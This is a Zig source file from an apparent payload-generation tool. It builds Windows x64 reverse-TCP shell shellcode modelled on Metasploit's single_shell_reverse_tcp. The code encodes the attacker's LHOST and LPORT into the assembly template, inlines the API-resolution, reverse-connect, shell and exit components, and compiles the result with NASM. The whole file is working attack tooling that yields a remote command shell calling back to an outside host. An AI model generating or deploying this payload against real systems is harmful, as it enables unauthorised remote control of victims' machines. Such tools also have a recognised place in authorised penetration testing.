const std = @import("std");
const comp_api = @import("components/api.zig");
const comp_exitfunk = @import("components/exitfunk.zig");
const comp_reverse_tcp = @import("components/reverse_tcp.zig");
const comp_shell = @import("components/shell.zig");
const utils = @import("../../utils.zig");
const common = @import("../../../common/lib.zig");
const options = @import("../../../options/lib.zig");

// Reference:
// https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/single/single_shell_reverse_tcp.asm
pub const asm_code =
    \\  cld ; Clear the destination flag
    \\  and rsp, 0xFFFFFFFFFFFFFFF0 ; Ensure RSP is 16 byte aligned
    \\  call start                  ; Call start, this pushes the address of 'api_call' onto the stack.
    \\
    \\  {COMP_API}                  ; %include "asm/windows/x64/components/comp_api.asm"
    \\
    \\start:
    \\  pop rbp     ; Pop off the address of 'api_call' for calling later.
    \\
    \\{COMP_REVERSE_TCP}            ; %include "asm/windows/x64/components/comp_reverse_tcp.asm"
    \\; By here we will have performed the reverse_tcp connection and EDI will be out socket.
    \\{COMP_SHELL}                  ; %include "asm/windows/x64/components/comp_shell.asm"
    \\; Finish up with the EXITFUNK
    \\{COMP_EXITFUNK}               ; %include "asm/windows/x64/components/comp_exitfunk.asm"
;

pub fn compile(
    allocator: std.mem.Allocator,
    asm_src_path: []const u8,
    asm_dest_path: []const u8,
    opts: options.Options,
) !void {
    // Get Hex-encoded LHOST+LPORT+AF_INET
    // Parse LHOST
    const lhost_u8 = try common.utils.parseIpAddress(opts.lhost.?);
    // Parse LPORT
    const lport_u8 = common.utils.parsePort(opts.lport.?);
    // Concat LPORT and LHOST
    // const lport_lhost = try std.mem.concat(allocator, u8, &[_][]const u8{ &lport_u8, &lhost_u8 });
    // Hex encoding (0002 = 0x2 = AF_INET)
    const local_addr = try std.fmt.allocPrint(
        allocator,
        "0x{x:0>2}{x:0>2}{x:0>2}{x:0>2}{x:0>2}{x:0>2}0002",
        .{ lhost_u8[3], lhost_u8[2], lhost_u8[1], lhost_u8[0], lport_u8[1], lport_u8[0] },
    );

    // try common.stdout.print("local_addr: {s}\n", .{local_addr});

    // Replace {COMP_API}
    var asm_code_size = std.mem.replacementSize(u8, asm_code, "{COMP_API}", comp_api.asm_code);
    const asm_code_new_4 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code, "{COMP_API}", comp_api.asm_code, asm_code_new_4);
    // Replace {COMP_REVERSE_TCP}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_4, "{COMP_REVERSE_TCP}", comp_reverse_tcp.asm_code);
    const asm_code_new_3 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_4, "{COMP_REVERSE_TCP}", comp_reverse_tcp.asm_code, asm_code_new_3);
    // Replace {COMP_SHELL}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_3, "{COMP_SHELL}", comp_shell.asm_code);
    const asm_code_new_2 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_3, "{COMP_SHELL}", comp_shell.asm_code, asm_code_new_2);
    // Replace {COMP_EXITFUNK}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_2, "{COMP_EXITFUNK}", comp_exitfunk.asm_code);
    const asm_code_new_1 = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_2, "{COMP_EXITFUNK}", comp_exitfunk.asm_code, asm_code_new_1);
    // Replace {LOCAL_ADDR}
    asm_code_size = std.mem.replacementSize(u8, asm_code_new_1, "{LOCAL_ADDR}", local_addr);
    const asm_code_new = try allocator.alloc(u8, asm_code_size);
    _ = std.mem.replace(u8, asm_code_new_1, "{LOCAL_ADDR}", local_addr, asm_code_new);

    try utils.compile_with_nasm(
        allocator,
        "win64",
        asm_src_path,
        asm_dest_path,
        asm_code_new,
    );
}
